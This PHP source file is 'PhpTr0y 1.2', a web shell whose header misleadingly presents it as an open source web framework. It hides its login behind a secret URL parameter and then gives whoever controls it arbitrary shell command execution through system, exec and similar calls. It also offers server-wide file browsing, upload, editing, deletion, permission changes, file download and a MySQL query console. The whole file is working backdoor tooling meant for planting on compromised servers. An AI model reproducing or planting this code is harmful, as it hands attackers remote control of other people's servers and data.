<?php
/**
 *  @author Stephen Lee <stephen.lee@lightworx.io>
 *  @link https://lightworx.io/
 *  @license The PHPTr0y is open source web framework released under the terms of the MIT License.
 *  @version 1.2
 */
error_reporting(7);

$tr0yname="root";
$tr0ypass="modify_password";
$checkmode['soc']="1";

if ( !ini_get('register_globals') ) 
{ 
    extract($_POST); 
    extract($_GET); 
    extract($_SERVER); 
    extract($_FILES); 
    extract($_ENV); 
    extract($_COOKIE); 
    if ( isset($_SESSION) ) 
    { 
        extract($_SESSION); 
    } 
}
if ($checkmode['soc']=="1"){
session_start();

   if ($_GET['get'] == "logout") {
   session_destroy();
   echo "<body onLoad=\"setTimeout('window.opener=null;window.close()', 3000)\">";
   echo "<span style=\"font-size:12px;font-family: Tahoma\">退出成功窗口在3秒种后关闭<p></span>";
   exit;
   }
        if ($_SESSION['admin']==$tr0yname && $_SESSION['pass']==$tr0ypass){
        $_SESSION['admin']=$tr0yname && $_SESSION['pass']=$tr0ypass;}else{
        if ($tr0yname==$_POST['name'] && $tr0ypass==$_POST['pass'])
        {
        $_SESSION['admin']=$tr0yname && $_SESSION['pass']=$tr0ypass;
        }else{
        login();
        }
}
}
else
{

  if ($_GET['get']=="logout"){
  setcookie ("admin", "");
  echo "<body onLoad=\"setTimeout('window.opener=null;window.close()', 3000)\">";
  echo "<span style=\"font-size:12px;font-family: Tahoma\">退出成功窗口在3秒种后关闭<p></span>";
   exit;
   }
        if (setcookie ("admin",$tr0ypass,time()+(1*24*3600))){
        setcookie ("admin",$tr0ypass,time()+(1*24*3600));}else{
        if ($tr0yname==$_POST['name'] && $tr0ypass==$_POST['pass'])
        {
        setcookie ("admin",$tr0ypass,time()+(1*24*3600));
        }else{
        login();
        }
}
}
if(!empty($down)) {
        if (!@file_exists($down)) {
        echo "<script>alert('你要下的文件不存在!')</script>";
        } else {
        $filename = basename($down);
        $filename_info = explode('.', $filename);
        $fileext = $filename_info[count($filename_info)-1];
        header('Content-type: application/x-'.$fileext);
        header('Content-Disposition: attachment; filename='.$filename);
        header('Content-Description: PHP Generated Data');
        header('Content-Length: '.filesize($down));
        @readfile($down);
        exit;
        }
}


$tr0ypath=str_replace('\\','/',dirname(__FILE__));
if (!isset($dirs) or empty($dirs)) {
        $dirs = ".";
        $nowpath = getPath($tr0ypath, $dirs);
} else {
        $dirs=$_GET['dirs'];
        $nowpath = getPath($tr0ypath, $dirs);
}
if (get_magic_quotes_gpc()) {
$_GET = stripslashes_array($_GET);
$_POST = stripslashes_array($_POST);
}

?>
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3c.org/TR/1999/REC-html401-19991224/loose.dtd">
<html xmlns="http://www.w3.org/1999/xhtml"  lang="zh-CN"/>
<head>
<title>PhpTr0y bY Stephen <?php echo "当前系统: ".PHP_OS.""?></title>
<meta http-equiv=Content-Language content="text/html; charset=gb2312" />
<style type="text/css">
body{margin:0px;PADDING:0px;font-family:'Microsoft Yahei', '微软雅黑', "Tahoma", Verdana, Lucida, Arial, Helvetica, 宋体,sans-serif;color:#FFF;font-size:14px;background:#677D92 left top;}
#title{margin:0px;padding:0px 0px 0px 0px;background:#8C0700;width:1006px;LINE-HEIGHT:18px;}
#body{margin:0px;padding:10px;width:1000px;color:#FFF;background:#556B80;LINE-HEIGHT:150%;text-align:left;border:#768CA3 3px solid;}
#action{width:1001px;color:#FFF;padding:5px;background:#8C0700;text-align:left;}
a:link{font-weight:normal;text-decoration:none;color:#FFF;}
a:visited {font-weight:normal;text-decoration:none;color:#FFF;}
a:hover {font-weight:normal;text-decoration:none;color:#FFF;}
a:active {font-weight:normal;text-decoration:none;color:#FFF;}
form{margin:0}
select {background-color: #ffffff; color: #000000; font-size: 12px; border: 0px #cccccc double}
input,textarea {background-color: #ffffff; color: #000000; font-family: tahoma; font-size: 12px; border: 1px #cccccc double;}
option {font-size: 12px; background-color: #f3f3f3; color: #51485f;}
</style>
</head>
<body>
<div align="center">
<div id="title"><a href="http://lightworx.io/" target="_blank"><b>PhpTr0y1.2</b></a>&nbsp;|&nbsp;<a href="<?php echo $_SERVER['PHP_SELF']?>"><b>返回根目录</b></a>&nbsp;|&nbsp;<a 

href="?get=logout"><b>退出</b></a>&nbsp;|&nbsp;<a href="?dir=phpinfo" target="_blank"><b>Phpinfo()</b></a>&nbsp;|&nbsp;<a 
href="?dir=shell"><b>Webshell</b></a>&nbsp;|&nbsp;<a href="?dir=mysql"><b>Mysql</b></a></div><br />
<div id="body"><div align="left">当前目录位置:<?php echo $nowpath?>/<br />程序所在位置:<?php echo $tr0ypath?>/<br />
        <form action="" method="get">跳转到指定目录:<input name="dirs" type="text" /><input type="submit" name="dirs" value="确定" /></form>
        <form action="" method="post" enctype="multipart/form-data">上传文件到当前位置:<input name="uploadfiles" type="file" /><input 

type="submit" name="uploadfile" value="确定"><input type="hidden" name="uploaddir" value="<?php echo $dirs?>" /></form>
        <form action="" method="post">在当前目录建立文件夹:<input name="newdir" type="text" value=""><input type="submit" name="createdir" value="确定"></form>
        <form action="" method="post">在当前目录新建文件:<input name="newfile" type="text" value=""><input type="submit" name="createfile" value="确定"></form></div></div><br 

/><?php
if($entereditfile) {
        $filename="$editfilename";
        @$fp=fopen("$filename","w");
        echo $msg=@fwrite($fp,$_POST['content']) ? "写入文件成功" : "写入失败";
        @fclose($fp);
}
elseif ($createdir){
        $newdirectory=$_POST['newdir'];
        if (@mkdir($newdirectory, 0777)){
        echo"<meta http-equiv=Content-Language content=\"text/html; charset=gb2312\" />";
        echo "建立目录成功请点击这里返回.如果没有发现目录请刷新页面.";
        }else{
        echo"<meta http-equiv=Content-Language content=\"text/html; charset=gb2312\" />";
        echo "建立目录没有成功,可能是现在的权限较低造成的或者你要创建的目录已经存在.请配置当前权限.";
        }
        }
elseif ($createfile) {
        $newfile=$_POST['newfile'];
?>
<div id="body">程序名称&内容:<form action="?dir=<?php echo urlencode($dir)?>" method="post"><input maxLength="100" size="50" name="editfilename" 
value="<?php echo $newfile?>" /><br /><textarea name="content" rows="23" cols="115"></textarea><br /><input type="submit"  name="entereditfile" 
value="确定新建" /></form></div>
<?php
}
elseif($chmod){
        $rechmod=base_convert($_POST['rechmod'],8,10);
        echo $msg=chmod($dir."/".$file,$rechmod) ? "权限修改成功," : "权限修改失败,";
        echo "修改后的属性为:".substr(base_convert(fileperms($dir."/".$file),10,8),-4)."";
}
elseif($rename){
        echo $msg=rename($dirs."/".$renamefile,$dirs."/".$renamefile2) ? "修改文件名成功" : "修改文件名失败";
}
elseif(@$delfile!="") {
        if(file_exists($delfile)) {
        if (@unlink($delfile)) {
        echo "".$delfile." 删除成功!";
        } else {
        echo "文件删除失败!";
}
        } else {
        echo "文件不存在,删除失败!";
        }
}

elseif($deldir) {
        if($deldir!="") {
        if(!file_exists("$deldir")) {
        echo "目录已不存在!";
        } else {
        if (@rmdir($deldir)){
        echo "目录删除成功";
        }else{
        echo "删除失败!";
        }
}
}
}
elseif($uploadfile) {
        echo $msg=@copy($_FILES['uploadfiles']['tmp_name'],"".$uploaddir."/".$_FILES['uploadfiles']['name']."") ? "上传成功" : "上传失败";
}
if($sql!=""){
$sql = trim(stripslashes($sql));
       mysql_query($sql,$conn);
           if(mysql_errno()==0)
           {
                  $errInfo = "成功执行指定的SQL指令！";
           } 
           else
           {
                  $errInfo = mysql_error();  
           }
}
if (!isset($_GET['dir']) OR empty($_GET['dir']) OR ($_GET['dir'] == "dir")){
$handle=@opendir($dirs);
while ($file = @readdir($handle)) {
    $test="$dirs/$file";
    $retest=@is_dir($test);
            if ($retest=="1"){
           $filesize=@filesize($file);
                    if($file!=".." && $file!="."){
                            $ctime=@date("Y-m-d H:i:s",@filectime($test));
                            $mtime=@date("Y-m-d H:i:s",@filemtime($test));
                            $dirperm=@substr(@base_convert(@fileperms($test),10,8),-4);
    echo "<div id=\"body\"><a href=\"?dirs=".urlencode($dirs)."/".urlencode($file)."\" title=\"创建时间: $ctime 最后修改时间: $mtime\">目录名称:<b>$file</b></a>&nbsp;
文件大小: $filesize KB &nbsp;&nbsp; 权限属性: $dirperm<br /><a href=\"?dir=".urlencode($dirs)."&deldir=".urlencode($dirs)."/".urlencode($file)."\" target=\"_blank\">删除</a> <a href=\"?

get=newname&newname=$file\" target=\"new\">改名</a> &nbsp;&nbsp;创建时间: $ctime 最后修改时间: $mtime</div>\n <br />";
    }else{
    if ($file==".."){
    echo"<div id=\"action\"><a href=\"?dirs=".urlencode($dirs)."/".urlencode($file)."\">上级目录</a></div>";
}}}}
echo "<div id=\"title\">目录读取完毕,以下是文件.</div><br />";
@closedir($handle);
echo "<form action=\"\" method=\"post\">";
$handle=@opendir($dirs);
while ($file = @readdir($handle)) {
    $test="$dirs/$file";
    $retest=@is_dir($test);
            if ($retest=="0"){
            $filesize=@filesize($file);
            $ctime=@date("Y-m-d H:i:s",@filectime($test));
            $mtime=@date("Y-m-d H:i:s",@filemtime($test));
            $dirperm=@substr(@base_convert(@fileperms($test),10,8),-4);
    echo "<div id=\"body\"><a href=\"$test\" target=\"_blank\" title=\"创建时间: $ctime 最后修改时间: $mtime\">文件名
称:<b> $file</b></a>&nbsp;文件大小: $filesize KB &nbsp;|&nbsp; 权限属性: <a href=\"?get=cmhod&dir=".urlencode($dirs)."&file=".urlencode($file)."\" target=\"_blank\">$dirperm</a><br /><a 

href=\"?down=".urlencode($test)."\">下载</a> <a href=\"?edit=editfile&dir=".urlencode($dirs)."&editfile=".urlencode($file)."\" target=\"_blank\">编辑</a> <a href=\"?

dir=".urlencode($dirs)."&delfile=".urlencode($dirs)."/".urlencode($file)."\" target=\"_blank\">删除</a> <a href=\"?dir=rename&dirs=".urlencode($dirs)."&renamefile=".urlencode($file)."\" target=\"_blank\">

改名</a> 创建时间: $ctime 最后修改时间: $mtime</div>\n <br />";
            }else{}
}
@closedir($handle);

}

elseif ($_GET['dir'] == "phpinfo") {
        echo"<meta http-equiv=Content-Language content=\"text/html; charset=gb2312\" />";
        echo $phpinfo=(!eregi("phpinfo",$dis_func)) ? phpinfo() : "phpinfo() 函数已被禁用.";
        exit;
}
elseif ($_GET['dir']=="rename"){
echo "<form action=\"\" method=\"post\"><input name=\"renamefile2\" type=\"text\" value=$renamefile />";
echo "<input type=\"hidden\" name=\"dirs\" value=$dirs />";
echo "<input name=\"renamefile\" type=\"hidden\" value=$renamefile />";
echo "<input type=\"submit\" name=\"rename\" value=\"确定\" /></form>";
}

elseif ($_GET['dir']=="shell"){
?>
<div id="body">
<form action="" method="post">
<select name="execfunc" class="input">
<option value="system" <?php if ($execfunc=="system") { echo "selected"; } ?>>system</option>
<option value="passthru" <?php if ($execfunc=="passthru") { echo "selected"; } ?>>passthru</option>
<option value="exec" <?php if ($execfunc=="exec") { echo "selected"; } ?>>exec</option>
<option value="shell_exec" <?php if ($execfunc=="shell_exec") { echo "selected"; } ?>>shell_exec</option>
<option value="popen" <?php if ($execfunc=="popen") { echo "selected"; } ?>>popen</option>
</select>
<input type="text" name="cmd" value="<?php echo $_POST['cmd']?>" />
<input type="submit" value="确定" /><br />
<textarea name="showbank" rows="23" cols="115" readonly="readonly"><?php
        if (!empty($_POST['cmd'])) {
                if ($execfunc=="system") {
                        system($_POST['cmd']);
                } elseif ($execfunc=="passthru") {
                        passthru($_POST['cmd']);
                } elseif ($execfunc=="exec") {
                        $result = exec($_POST['cmd']);
                        echo $result;
                } elseif ($execfunc=="shell_exec") {
                        $result=shell_exec($_POST['cmd']);
                        echo $result;        
                } elseif ($execfunc=="popen") {
                        $pp = popen($_POST['cmd'], 'r');
                        $read = fread($pp, 2096);
                        echo $read;
                        pclose($pp);
                } else {
                        system($_POST['cmd']);
                }
        }
        ?></textarea>
</form>
</div>
<?php
}

elseif ($_GET['dir']=="mysql") {
?>
<div id="body">
<form action="" method="post">
服务器地址:<input type="text" name="mysqlhost" value="localhost:3306" />
用户名:<input type="text" name="mysqluser" value="root" /><br />
数据库密码:<input type="text" name="mysqlpass" value="" />
数据库:<input type="text" name="mysqldb" value="" />
<input type="submit" name="mysql" value="确定" />
</form>
</div>
<?php
if ($mysql) {
if($exec=mysql_connect($_POST['mysqlhost'],$_POST['mysqluser'],$_POST['mysqlpass']) and mysql_select_db($_POST['mysqldb'])) {
echo "数据库连接成功.";
echo "<div id=\"body\"><form action=\"\" method=\"post\">";
echo "<textarea name=\"sql\" rows=\"32\" cols=\"115\">$sql</textarea><br />";
echo "<input type=\"submit\" value=\"确定\" />你可以在此处执行MySQL命令.";
echo "</form></div>";
}else{
echo "数据库连接失败,请检查输入内容是否正确.";
}
}
}
elseif ($_GET['get']=="cmhod"){
?>
设置权限:<form action="" method="post"><input type="text" name="file" value="<?php echo $file?>" readonly="readonly" /><br /><input type="text" name="rechmod" 

value="<?php echo @substr(@base_convert(@fileperms($dir."/".$file),10,8),-4)?>" /><input name="dir" type="hidden" value="<?php echo $_GET['dir']?>" /><input type="submit" name="chmod" value="确定" 

/></form>
<?php
}
elseif ($_GET['edit']=="editfile"){
    if ($newfile==""){
    $filename="$dir/$editfile";
    $fp=@fopen($filename,"r");
    $contents=@fread($fp, filesize($filename));
    @fclose($fp);
    $contents=htmlspecialchars($contents);
    }else{
    $editfile=$newfile;
    $filename = "$dir/$editfile";
    }

?>
        
        <div id="body">程序名称&内容:<form action="?dir=<?php echo urlencode($dir);?>" method="post"><input maxLength="100" size="50" name="editfilename" 

value="<?php echo $filename;?>" /><br /><textarea name="content" rows="23" style="width:100%;"><?php echo $contents;?></textarea><br /><input type="submit"  name="entereditfile" 

value="确定编辑" /></form></div>

<?php
}

?>
<div id="action">程序制作:Stephen.免责声明:此程序仅用于技术交流,任何违法行为于程序作者无关.<br />Copyright &copy; 2006-2014 lightworx.io All Rights Reserved.</div>
</div>
</body>
</html>
<?php
function login() {
        $get="phptr0y";
        if ($_GET['get']==$get) {
?>
<style tpye="text/css">
select {background-color: #ffffff; color: #000000; font-size: 12px; border: 0px #cccccc double;}
input,textarea {background-color: #ffffff; color: #000000; font-family: tahoma; font-size: 12px; border: 1px #cccccc double;}
option {font-size: 12px; background-color: #f3f3f3; color: #51485f;}
</style>
<form method="post" action="<?php echo $_SERVER['PHP_SELF'];?>"><input name="name" type="text" id="name" /><br /><input name="pass" type="password" id="pass" 

/><br /><input type="submit" value="ok" /></form>
<?php
}
else
{
echo"";
}
exit;
}
function stripslashes_array(&$array) {
while(list($key,$var) = each($array)) {
if ($key != 'argc' && $key != 'argv' && (strtoupper($key) != $key || ''.intval($key) == "$key")) {
if (is_string($var)) {
$array[$key] = stripslashes($var);
}
if (is_array($var))  {
$array[$key] = stripslashes_array($var);
}
}
}
return $array;
}
function getPath($mainpath, $relativepath) {
global $dirs;
$mainpath_info = explode('/', $mainpath);
$relativepath_info       = explode('/', $relativepath);
$relativepath_info_count = count($relativepath_info);
for ($i=0; $i<$relativepath_info_count; $i++) {
if ($relativepath_info[$i] == '.' || $relativepath_info[$i] == '') continue;
if ($relativepath_info[$i] == '..') {
$mainpath_info_count = count($mainpath_info);
unset($mainpath_info[$mainpath_info_count-1]);
continue;
}
$mainpath_info[count($mainpath_info)] = $relativepath_info[$i];
} //end for
return implode('/', $mainpath_info);
}
?>
